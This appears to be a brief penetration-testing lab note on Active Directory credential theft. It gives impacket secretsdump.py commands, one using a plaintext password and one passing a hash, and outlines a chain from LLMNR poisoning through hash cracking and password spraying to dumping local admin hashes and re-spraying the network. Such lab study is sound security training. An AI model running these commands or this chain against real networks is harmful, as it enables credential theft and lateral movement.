

```
secretsdump.py MARVEL.local/fcastle:'Password1'@192.168.176.129
```

```
secretsdump.py administrator@192.168.176.129 -hashes 'random-hash-here'
```

log on and clear-text passwords might be visible so be wary.

dump sam of EVERY. MACHINE. YOU. PWN.

the possible path here is LLMNR -> user hash -> crack -> password spray -> found new login -> secretsdump.py that new login -> get local admin hashes -> re-spray the network

You can also crack these NTLM hashes

the format of these hashes is `LM:NT`, you only really need the NT part